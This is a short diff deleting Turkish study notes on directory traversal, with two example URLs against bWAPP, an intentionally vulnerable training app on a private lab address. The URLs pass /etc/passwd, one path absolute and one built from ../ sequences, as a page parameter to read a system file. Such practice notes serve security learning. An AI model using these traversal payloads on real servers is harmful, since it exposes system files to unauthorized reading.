@@ -1,4 +1,0 @@
-DIRECTORY TRAVERSAL
-Directory Traversal-Files (normalde erisimimiz olmayan dosyalara Bug ile ulasabilmek.)
-http://10.0.2.4/bWAPP/directory_traversal_1.php?page=/etc/passwd
-http://10.0.2.4/bWAPP/directory_traversal_1.php?page=../../../../etc/passwd
